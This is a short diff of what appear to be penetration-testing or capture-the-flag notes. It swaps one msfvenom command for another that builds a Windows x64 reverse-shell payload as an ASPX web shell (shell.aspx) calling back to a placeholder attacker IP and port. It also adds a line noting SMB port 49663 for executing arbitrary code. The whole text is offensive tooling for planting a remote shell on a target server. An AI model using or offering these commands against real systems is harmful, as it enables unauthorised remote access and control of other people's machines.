@@ -1,7 +1,7 @@
 
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f aspx -o shell.aspx
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f aspx -o shell.aspx
 
-execute arbitrary code/commands 
+SMB PORT: 49663 - execute arbitrary code/commands  
 
 
 
